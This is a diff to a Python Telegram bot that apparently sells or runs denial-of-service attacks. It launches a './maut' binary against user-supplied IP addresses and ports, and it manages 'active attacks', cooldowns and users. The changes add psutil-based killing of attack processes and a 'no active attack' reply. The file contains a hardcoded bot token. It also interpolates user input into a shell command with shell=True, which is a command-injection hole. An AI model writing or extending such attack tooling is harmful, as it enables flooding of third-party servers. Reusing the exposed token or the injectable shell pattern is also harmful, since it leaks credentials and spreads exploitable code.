@@ -7,6 +7,7 @@ import time
 import re
 from threading import Lock
 import signal
+import psutil
 
 # Bot configuration
 bot = telebot.TeleBot('7724010740:AAHl1Avs1FDKlfvTjABS3ffe6-nVhkcGCj0')
@@ -97,14 +98,24 @@ def remove_active_attack(user_id):
         if user_id in active_attacks:
             if user_id in processes:
                 try:
-                    # Kill the process group to ensure all child processes are terminated
-                    os.killpg(os.getpgid(processes[user_id].pid), signal.SIGTERM)
-                except ProcessLookupError:
-                    pass  # Process already terminated
+                    # Kill the entire process tree
+                    process = processes[user_id]
+                    parent = psutil.Process(process.pid)
+                    for child in parent.children(recursive=True):
+                        try:
+                            child.kill()
+                        except:
+                            pass
+                    try:
+                        parent.kill()
+                    except:
+                        pass
                 except Exception as e:
-                    print(f"Error terminating process: {e}")
+                    print(f"Error killing process: {e}")
                 del processes[user_id]
             del active_attacks[user_id]
+            return True
+    return False
 
 def get_active_attack_info():
     with attack_lock:
@@ -265,7 +276,10 @@ def stop_attack(message):
     
     try:
         # Stop the attack
-        remove_active_attack(user_id)
+        was_active = remove_active_attack(user_id)
+        
+        if not was_active:
+            return bot.reply_to(message, "ℹ️ No active attack found to stop.")
         
         # Update cooldown
         maut_cooldown[user_id] = datetime.datetime.now()
@@ -291,9 +305,11 @@ def handle_buttons(call):
         data = user_attack_data[user_id]
         try:
             # Execute attack - create new process group
-            process = subprocess.Popen(f"./maut {data['ip']} {data['port']} {data['time']} 900", 
-                                     shell=True, 
-                                     preexec_fn=os.setsid)
+            process = subprocess.Popen(
+                f"./maut {data['ip']} {data['port']} {data['time']} 900", 
+                shell=True, 
+                preexec_fn=os.setsid
+            )
             
             # Mark attack as active
             add_active_attack(user_id, int(data['time']), process)
@@ -409,7 +425,7 @@ def remove_user(message):
         if user_to_remove in user_time_limits:
             del user_time_limits[user_to_remove]
         save_users()
-        bot.reply_to_message(message, f"✅ User {user_to_remove} removed.")
+        bot.reply_to(message, f"✅ User {user_to_remove} removed.")
     except:
         bot.reply_to(message, "❌ Usage: /remove <user_id>")
 
